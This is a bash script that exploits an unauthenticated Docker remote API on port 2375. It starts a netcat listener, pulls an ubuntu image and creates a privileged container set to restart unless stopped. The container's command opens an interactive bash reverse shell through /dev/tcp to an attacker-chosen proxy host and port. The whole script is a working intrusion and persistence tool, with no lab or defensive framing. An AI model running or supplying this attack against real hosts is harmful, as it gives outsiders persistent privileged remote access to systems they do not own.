#!/bin/bash

# Prompt for inputs
read -p "Enter Docker host IP (e.g. 192.168.1.10): " DOCKER_IP
read -p "Enter proxy reverse shell address (e.g. proxy50.rt3.io): " PROXY_HOST
read -p "Enter proxy reverse shell port (e.g. 32532): " PROXY_PORT

LOCAL_LISTEN_PORT=4444

# Start netcat listener in a new terminal
echo "[*] Starting Netcat listener on local port $LOCAL_LISTEN_PORT..."
if command -v gnome-terminal &>/dev/null; then
    gnome-terminal -- bash -c "nc -lvnp $LOCAL_LISTEN_PORT; exec bash"
elif command -v x-terminal-emulator &>/dev/null; then
    x-terminal-emulator -e "bash -c 'nc -lvnp $LOCAL_LISTEN_PORT; exec bash'"
elif command -v xterm &>/dev/null; then
    xterm -hold -e "nc -lvnp $LOCAL_LISTEN_PORT" &
else
    echo "[!] No compatible terminal found to auto-open listener. Please run manually:"
    echo "    nc -lvnp $LOCAL_LISTEN_PORT"
fi

# Pull ubuntu image
echo "[*] Pulling ubuntu:22.04 image..."
curl -s -X POST "http://$DOCKER_IP:2375/images/create?fromImage=ubuntu&tag=22.04" > /dev/null

# Create container with reverse shell to $PROXY_HOST:$PROXY_PORT (single attempt, stays alive)
echo "[*] Creating privileged container with reverse shell to $PROXY_HOST:$PROXY_PORT..."
CREATE_RESPONSE=$(curl -s -X POST "http://$DOCKER_IP:2375/containers/create" \
-H "Content-Type: application/json" \
-d "{
  \"Image\": \"ubuntu:22.04\",
  \"Tty\": true,
  \"HostConfig\": {
    \"Privileged\": true,
    \"RestartPolicy\": {
      \"Name\": \"unless-stopped\"
    }
  },
  \"Cmd\": [\"/bin/bash\", \"-c\", \"bash -i >& /dev/tcp/$PROXY_HOST/$PROXY_PORT 0>&1; exec sleep infinity\"]
}")

# Extract container ID
CONTAINER_ID=$(echo "$CREATE_RESPONSE" | grep -o '"Id":"[^"]*' | cut -d':' -f2 | tr -d '"')

if [ -z "$CONTAINER_ID" ]; then
  echo "[!] Failed to create container."
  echo "$CREATE_RESPONSE"
  exit 1
fi

# Start the container
echo "[*] Starting container $CONTAINER_ID..."
curl -s -X POST "http://$DOCKER_IP:2375/containers/$CONTAINER_ID/start" > /dev/null

# Final output
echo "[+] Container started: $CONTAINER_ID"
echo "[+] Reverse shell initiated (one-shot). Container will remain alive after disconnect."
echo "[+] Waiting for reverse shell connection on port $LOCAL_LISTEN_PORT..."

